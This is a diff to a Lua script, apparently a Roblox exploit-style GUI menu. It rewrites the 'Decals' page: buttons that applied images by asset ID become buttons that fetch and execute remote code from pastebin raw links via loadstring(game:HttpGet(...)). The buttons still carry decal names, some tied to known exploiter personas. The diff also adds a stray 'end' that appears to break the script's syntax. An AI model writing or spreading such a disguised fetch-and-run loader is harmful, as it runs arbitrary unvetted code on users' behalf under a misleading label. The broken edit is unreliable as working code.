@@ -331,24 +331,20 @@ local function showPage(name)
 
     elseif name == "Decals" then
         local decals = {
-            {"Glitch Face", "707922981"},
-            {"Tubers93 Logo", "11127174715"},
-            {"Red Eyes", "49488484"},
+            {"k00pkidd Decal", "https://pastebin.com/raw/86sciNmu"},
+            {"tubers93 Decal", "https://pastebin.com/raw/dvZiUaKG"},
+            {"c00lkidd Decal", "https://pastebin.com/raw/xzj0r1V1"},
+            {"g00byd0lan Decal", "https://pastebin.com/raw/NQatNpx8"},
         }
         for _, d in ipairs(decals) do
             addContentButton(d[1], function()
-                local decal = Instance.new("Decal")
-                decal.Texture = "rbxassetid://" .. d[2]
-                if player.Character and player.Character:FindFirstChild("Head") then
-                    local face = player.Character.Head:FindFirstChild("face")
-                    if face then face:Destroy() end
-                    decal.Parent = player.Character.Head
-                else
-                    decal.Parent = workspace
-                end
-                notify("DECAL SUCCESSFULLY APPLIED: " .. d[1])
+                pcall(function()
+                    loadstring(game:HttpGet(d[2]))()
+                end)
+                notify("DECAL SCRIPT EXECUTED: " .. d[1])
             end)
         end
+    end
 
     elseif name == "Podcast" then
         local lines = {
